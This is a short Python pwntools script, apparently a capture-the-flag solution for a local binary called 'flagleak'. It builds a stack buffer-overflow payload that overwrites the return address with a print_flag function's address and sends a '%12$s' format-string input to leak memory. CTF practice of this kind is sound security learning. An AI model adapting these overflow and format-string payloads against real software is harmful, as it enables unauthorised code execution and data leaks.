from pwn import *

elf = context.binary = ELF("./flagleak")

print_flag = elf.symbols.print_flag

formatString = b'%12$s'

junk = b'A' * 0x68
payload = junk 

payload += p64(print_flag) + b'A' *8  

# f = open("pay", "wb")
# f.write(payload)
# f.close()

io = process()
io.recvline()
io.sendline(payload)
io.recvline()
io.sendline(formatString)
# io.interactive()
print(io.recv().decode())